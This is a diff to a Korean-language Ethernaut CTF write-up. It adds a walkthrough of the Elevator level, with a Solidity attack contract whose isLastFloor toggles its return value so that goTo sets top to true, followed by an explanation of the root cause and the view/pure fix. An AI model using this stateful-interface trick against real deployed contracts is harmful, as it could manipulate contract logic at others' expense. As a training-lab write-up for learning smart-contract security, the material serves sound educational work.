@@ -184,7 +184,68 @@ modifier noReentrant() {
 
 ### Elevator
 
-- **Elevator**: 외부 컨트랙트에 의존한 로직이 반복 호출마다 다른 값을 반환하도록 설계돼 엘리베이터 층수 검증을 우회했습니다. 신뢰할 수 없는 컨트랙트와 통신할 때는 반환값을 검증하고 동일한 인터페이스를 강제해야 합니다.
+[Elevator](https://ethernaut.openzeppelin.com/level/11)은 빌딩의 꼭대기에 도달하는 문제입니다. 컨트랙트에 보면 top이라는 boll 타입의 변수가 있는데 이 값을 true로 바꾸면 됩니다.
+
+컨트랙트에서 goTo 함수를 호출하면 그 컨트랙트의 주소(`msg.sender`)를 Building 타입으로 보고 `isLastFloor()`를 호출한다. 우리는 Building interface와 동일한 컨트랙트를 통해 top을 true로 바꿀 것이다.
+
+`isLastFloor`는 `goTo` 함수 내에서 두 번 호출된다. 처음은 조건 검사이고 두 번째는 top을 변경하기 위한 용도이다. 처음 `isLastFloor`가 호출되었을 때 false이고 그 다음 호출되기 전에 true라면 top은 true로 바뀔 수 있다. Build의 isLastFloor가 다음과 같이 동작하도록 구현하면 된다.
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+interface IBuilding {
+    function isLastFloor(uint) external returns (bool);
+}
+
+contract Building is IBuilding {
+    IElevator public target;
+    bool private toggle;
+
+    constructor(address _elevator) {
+        target = IElevator(_elevator);
+        toggle = false;
+    }
+
+    // Elevator가 두 번 호출하는 함수
+    function isLastFloor(uint) external override returns (bool) {
+        if (!toggle) {
+            toggle = true;
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    function attack(uint _floor) external {
+        target.goTo(_floor);
+    }
+}
+```
+
+먼저 Elvator 컨트랙트를 주소를 받아와 Building을 배포할 때 인자로 넘겨준다.
+
+![Elevator Address](./images/elevator_address.png)
+
+![Elevator Deploy](./images/elevator_deploy.png)
+
+이후, Attack 함수를 호출해 공격한다. 이때 인자는 이동할 층으로, 아무 값이나 상관없다.
+
+![Elevator Attack](./images/elevator_address.png)
+
+정상적으로 top이 true로 변경했는지 확인한다. true이면 제출하면 된다.
+
+![Elevator Solution](./images/elevator_deploy.png)
+
+이 문제는 `isLastFloor`라는 함수가 순수(pure)하게 동작하지 않았기 때문에 발생한 문제입니다. `isLastFloor`는 입력에 따라 마지막 층인지만 확인하고 그 결과를 반환해야 하는데 실제론 toggle이라는 상태를 가지고 상태에 따라 반환값이 달라지게 구현하였습니다. 즉, 실제로 pure하게 동작해야 하는데 외부 컨트랙트를 통해 그렇지 않게 동작하였습니다.
+
+이를 막기 위해 함수의 정의(interface)에서 어떤 역할을 하는지 명시적으로 알려줄 필요가 있고 상태를 변경하지 않는 함수라면 view나 pure를 사용해야 합니다.
+
+![Elevator Tip](./images/elevator_tip.png)
 
 ## 프로젝트 취약점 점검
 
